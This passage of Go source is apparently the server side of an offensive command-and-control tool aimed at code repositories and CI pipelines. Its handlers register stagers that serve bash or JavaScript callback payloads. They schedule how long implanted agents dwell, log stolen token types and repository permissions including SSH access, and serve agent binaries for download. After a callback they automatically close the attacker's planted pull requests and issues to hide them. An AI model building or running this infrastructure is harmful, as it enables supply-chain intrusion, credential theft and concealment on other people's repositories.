		payload = renderStagerPayloadTemplate(stager.Payload, kitchenURL, agentID, stager.SessionID, agentToken, stager.ID, invocation.Mode, invocation.DwellTime)
	} else {
		switch stager.ResponseType {
		case "js", "javascript":
			payload = DefaultJSPayloadWithToken(kitchenURL, agentID, stager.SessionID, agentToken, stager.ID, invocation.Mode)
		default:
			payload = DefaultBashPayloadWithDwell(kitchenURL, agentID, stager.SessionID, agentToken, stager.ID, invocation.Mode, invocation.DwellTime)
		}
	}

	slog.Info("stager callback: returning payload",
		"stager_id", stagerID,
		"kitchen_url", kitchenURL,
		"payload_len", len(payload),
	)

	if shouldAutoCloseStager(stager) {
		go func() {
			ctx := context.Background()
			if prURL := stager.Metadata["lotp_pr_url"]; prURL != "" {
				token := stager.Metadata["lotp_token"]
				if err := closePRByURL(ctx, token, prURL); err != nil {
					slog.Warn("failed to close LOTP PR", "pr_url", prURL, "error", err)
				} else {
					slog.Info("closed LOTP PR after callback", "pr_url", prURL)
				}
			}
			if prURL := stager.Metadata["pr_url"]; prURL != "" {
				token := stager.Metadata["deploy_token"]
				if err := closePRByURL(ctx, token, prURL); err != nil {
					slog.Warn("failed to close deployed PR", "pr_url", prURL, "error", err)
				} else {
					slog.Info("closed deployed PR after callback", "pr_url", prURL)
				}
			}
			if issueURL := stager.Metadata["issue_url"]; issueURL != "" {
				token := stager.Metadata["deploy_token"]
				if err := closeIssueByURL(ctx, token, issueURL); err != nil {
					slog.Warn("failed to close deployed issue", "issue_url", issueURL, "error", err)
				} else {
					slog.Info("closed deployed issue after callback", "issue_url", issueURL)
				}
			}
		}()
	}

	if h.sessions != nil && stager.SessionID != "" && invocation.DwellTime > 0 {
		deadline := time.Now().Add(invocation.DwellTime)
		h.sessions.SetSessionDwellDeadline(stager.SessionID, &deadline)
		slog.Info("stager triggered: set dwell deadline", "session_id", stager.SessionID, "deadline", deadline)

		if h.database != nil {
			agentRepo := db.NewAgentRepository(h.database)
			if err := agentRepo.SetDwellDeadline(stager.SessionID, &deadline); err != nil {
				slog.Warn("failed to persist dwell deadline", "session_id", stager.SessionID, "error", err)
			}
		}
	}

	contentType := "text/plain"
	switch stager.ResponseType {
	case "js", "javascript":
		contentType = "application/javascript"
	case "python":
		contentType = "text/x-python"
	}

	w.Header().Set("Content-Type", contentType)
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(payload))
}

// StagerRegisterRequest is the request body for registering a stager.
type StagerRegisterRequest struct {
	ResponseType string            `json:"response_type"`
	Payload      string            `json:"payload"`
	SessionID    string            `json:"session_id"`
	TTLSeconds   int               `json:"ttl_seconds"`
	Metadata     map[string]string `json:"metadata"`
	DwellTime    string            `json:"dwell_time"`
	Persistent   bool              `json:"persistent,omitempty"`
	MaxCallbacks int               `json:"max_callbacks,omitempty"`
	DefaultMode  string            `json:"default_mode,omitempty"`
}

// handleStagerRegister handles registration of new stagers from Counter.
func (h *Handler) handleStagerRegister(w http.ResponseWriter, r *http.Request) {
	stagerID := r.PathValue("stagerID")
	if !isValidID(stagerID) {
		http.Error(w, "invalid stager ID", http.StatusBadRequest)
		return
	}

	var req StagerRegisterRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.ResponseType == "" {
		req.ResponseType = "bash"
	}

	var dwellTime time.Duration
	if req.DwellTime != "" {
		var err error
		dwellTime, err = time.ParseDuration(req.DwellTime)
		if err != nil {
			slog.Warn("invalid dwell time, using express mode", "dwell_time", req.DwellTime, "error", err)
			dwellTime = 0
		}
	}
	if req.DefaultMode != "" && req.DefaultMode != CallbackModeExpress && req.DefaultMode != CallbackModeDwell {
		http.Error(w, "invalid default_mode: must be \"express\" or \"dwell\"", http.StatusBadRequest)
		return
	}
	if req.Persistent && req.DefaultMode == CallbackModeDwell && dwellTime <= 0 {
		http.Error(w, "persistent dwell mode requires a dwell duration", http.StatusBadRequest)
		return
	}

	stager := &RegisteredStager{
		ID:           stagerID,
		ResponseType: req.ResponseType,
		Payload:      req.Payload,
		SessionID:    req.SessionID,
		Metadata:     req.Metadata,
		CreatedAt:    time.Now(),
		DwellTime:    dwellTime,
		Persistent:   req.Persistent,
		MaxCallbacks: req.MaxCallbacks,
		DefaultMode:  req.DefaultMode,
	}

	if req.TTLSeconds > 0 {
		stager.ExpiresAt = stager.CreatedAt.Add(time.Duration(req.TTLSeconds) * time.Second)
	}

	if err := h.registerStager(stager); err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}

	callbackURL := stagerurl.Join(getKitchenURL(r), stagerID)
	resp := map[string]any{
		"status":       "registered",
		"stager_id":    stagerID,
		"callback_url": callbackURL,
		"callback":     callbackSummary(stager),
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	_ = json.NewEncoder(w).Encode(resp)
}

func (h *Handler) registerStager(stager *RegisteredStager) error {
	if err := h.stagerStore.Register(stager); err != nil {
		return err
	}
	h.persistStager(stager)
	return nil
}

// StagerStore returns the stager store for external access.
func (h *Handler) StagerStore() *StagerStore {
	return h.stagerStore
}

// persistAgent saves an agent to the database.
func (h *Handler) persistAgent(agent *AgentState) {
	if h.database == nil {
		return
	}
	row := &db.AgentRow{
		AgentID:       agent.AgentID,
		SessionID:     agent.SessionID,
		Hostname:      agent.Hostname,
		OS:            agent.OS,
		Arch:          agent.Arch,
		FirstSeen:     agent.FirstSeen,
		LastSeen:      agent.LastSeen,
		IsOnline:      agent.IsOnline,
		DwellDeadline: agent.DwellDeadline,
	}
	agentRepo := db.NewAgentRepository(h.database)
	if err := agentRepo.Upsert(row); err != nil {
		slog.Warn("failed to persist agent", "agent_id", agent.AgentID, "error", err)
	}
}

func shouldAutoCloseStager(stager *RegisteredStager) bool {
	if stager == nil || stager.Persistent || stager.MaxCallbacks <= 0 {
		return false
	}
	return stager.CallbackCount >= stager.MaxCallbacks
}

// HistoryRequest is the request body for recording history.
type HistoryRequest struct {
	Type       string `json:"type"`
	SessionID  string `json:"session_id,omitempty"`
	Target     string `json:"target,omitempty"`
	TargetType string `json:"target_type,omitempty"`
	TokenType  string `json:"token_type,omitempty"`
	VulnID     string `json:"vuln_id,omitempty"`
	Repository string `json:"repository,omitempty"`
	StagerID   string `json:"stager_id,omitempty"`
	PRURL      string `json:"pr_url,omitempty"`
	Outcome    string `json:"outcome,omitempty"`
	Error      string `json:"error,omitempty"`
	AgentID    string `json:"agent_id,omitempty"`
}

// HistoryResponse is the response for history recording.
type HistoryResponse struct {
	ID     string `json:"id"`
	Status string `json:"status"`
}

// handleGetHistory returns operation history entries.
func (h *Handler) handleGetHistory(w http.ResponseWriter, r *http.Request) {
	if h.database == nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"entries":[]}`))
		return
	}

	repo := db.NewHistoryRepository(h.database)

	var entries []*db.HistoryRow
	var err error

	sinceStr := r.URL.Query().Get("since")
	sessionID := r.URL.Query().Get("session")
	limitStr := r.URL.Query().Get("limit")

	limit := 100
	if limitStr != "" {
		if _, parseErr := fmt.Sscanf(limitStr, "%d", &limit); parseErr != nil {
			limit = 100
		}
	}

	switch {
	case sinceStr != "":
		since, parseErr := time.Parse(time.RFC3339, sinceStr)
		if parseErr != nil {
			http.Error(w, "invalid since timestamp", http.StatusBadRequest)
			return
		}
		entries, err = repo.ListSince(since)
	case sessionID != "":
		entries, err = repo.ListBySession(sessionID)
	default:
		entries, err = repo.List(limit)
	}

	if err != nil {
		http.Error(w, "failed to fetch history", http.StatusInternalServerError)
		return
	}

	if limit > 0 && len(entries) > limit {
		entries = entries[:limit]
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_ = json.NewEncoder(w).Encode(map[string]interface{}{"entries": entries})
}

// handlePostHistory records a new history entry.
func (h *Handler) handlePostHistory(w http.ResponseWriter, r *http.Request) {
	var req HistoryRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.Type == "" {
		http.Error(w, "type is required", http.StatusBadRequest)
		return
	}

	entryID := fmt.Sprintf("hist_%d_%s", time.Now().UnixNano(), req.Type[:3])

	row := &db.HistoryRow{
		ID:          entryID,
		Type:        db.HistoryEventType(req.Type),
		Timestamp:   time.Now(),
		SessionID:   req.SessionID,
		Target:      req.Target,
		TargetType:  req.TargetType,
		TokenType:   req.TokenType,
		VulnID:      req.VulnID,
		Repository:  req.Repository,
		StagerID:    req.StagerID,
		PRURL:       req.PRURL,
		Outcome:     req.Outcome,
		ErrorDetail: req.Error,
		AgentID:     req.AgentID,
	}

	if h.database != nil {
		repo := db.NewHistoryRepository(h.database)
		if err := repo.Insert(row); err != nil {
			slog.Warn("failed to persist history", "error", err)
		}
	}

	if h.operators != nil {
		h.operators.BroadcastHistory(HistoryPayload{
			ID:          row.ID,
			Type:        string(row.Type),
			Timestamp:   row.Timestamp,
			SessionID:   row.SessionID,
			Target:      row.Target,
			TargetType:  row.TargetType,
			TokenType:   row.TokenType,
			VulnID:      row.VulnID,
			Repository:  row.Repository,
			StagerID:    row.StagerID,
			PRURL:       row.PRURL,
			Outcome:     row.Outcome,
			ErrorDetail: row.ErrorDetail,
			AgentID:     row.AgentID,
		})
	}

	resp := HistoryResponse{
		ID:     entryID,
		Status: "recorded",
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	_ = json.NewEncoder(w).Encode(resp)
}

// KnownEntityRequest is the request body for upserting a known entity.
type KnownEntityRequest struct {
	ID            string   `json:"id"`
	EntityType    string   `json:"entity_type"`
	Name          string   `json:"name"`
	SessionID     string   `json:"session_id"`
	DiscoveredVia string   `json:"discovered_via,omitempty"`
	IsPrivate     bool     `json:"is_private,omitempty"`
	Permissions   []string `json:"permissions,omitempty"`
	SSHPermission string   `json:"ssh_permission,omitempty"`
}

// KnownEntityResponse is the response for known entity operations.
type KnownEntityResponse struct {
	ID     string `json:"id"`
	Status string `json:"status"`
}

// handleGetKnownEntities returns known entities filtered by session and/or type.
func (h *Handler) handleGetKnownEntities(w http.ResponseWriter, r *http.Request) {
	if h.database == nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"entities":[]}`))
		return
	}

	repo := db.NewKnownEntityRepository(h.database)

	sessionID := r.URL.Query().Get("session_id")
	entityType := r.URL.Query().Get("type")

	var entities []*db.KnownEntityRow
	var err error

	if sessionID == "" {
		http.Error(w, "session_id is required", http.StatusBadRequest)
		return
	}

	switch entityType {
	case "repo":
		entities, err = repo.ListRepos(sessionID)
	case "org":
		entities, err = repo.ListOrgs(sessionID)
	default:
		entities, err = repo.ListBySession(sessionID)
	}

	if err != nil {
		http.Error(w, "failed to fetch known entities", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_ = json.NewEncoder(w).Encode(map[string]interface{}{"entities": entities})
}

// handlePostKnownEntities upserts a known entity.
func (h *Handler) handlePostKnownEntities(w http.ResponseWriter, r *http.Request) {
	var req KnownEntityRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.ID == "" || req.SessionID == "" {
		http.Error(w, "id and session_id are required", http.StatusBadRequest)
		return
	}

	if req.EntityType == "" {
		req.EntityType = "repo"
	}

	row := &db.KnownEntityRow{
		ID:            req.ID,
		EntityType:    db.EntityType(req.EntityType),
		Name:          req.Name,
		SessionID:     req.SessionID,
		DiscoveredVia: req.DiscoveredVia,
		IsPrivate:     req.IsPrivate,
		Permissions:   req.Permissions,
		SSHPermission: req.SSHPermission,
	}

	if h.database != nil {
		repo := db.NewKnownEntityRepository(h.database)
		if err := repo.Upsert(row); err != nil {
			slog.Warn("failed to persist known entity", "id", req.ID, "error", err)
			http.Error(w, "failed to persist entity", http.StatusInternalServerError)
			return
		}
	}

	if req.EntityType == "repo" {
		parts := strings.Split(req.Name, "/")
		if len(parts) >= 2 {
			p := h.Pantry()
			upsertKnownRepoAsset(p, row)
			_ = h.SavePantry()
		}
	}

	resp := KnownEntityResponse{
		ID:     req.ID,
		Status: "recorded",
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	_ = json.NewEncoder(w).Encode(resp)
}

// handleAgentDownload serves agent binaries from embedded FS.
func (h *Handler) handleAgentDownload(w http.ResponseWriter, r *http.Request) {
	filename := r.PathValue("filename")
	if filename == "" {
		http.Error(w, "filename required", http.StatusBadRequest)
		return
	}

	for _, c := range filename {
		isLower := c >= 'a' && c <= 'z'
		isUpper := c >= 'A' && c <= 'Z'
		isDigit := c >= '0' && c <= '9'
		isSpecial := c == '-' || c == '_' || c == '.'
		if !isLower && !isUpper && !isDigit && !isSpecial {
			http.Error(w, "invalid filename", http.StatusBadRequest)
			return
		}
	}

	data, err := agents.Binaries.ReadFile(filename)
	if err != nil {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}

	rc := http.NewResponseController(w)
	_ = rc.SetWriteDeadline(time.Now().Add(5 * time.Minute))

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(data)
}
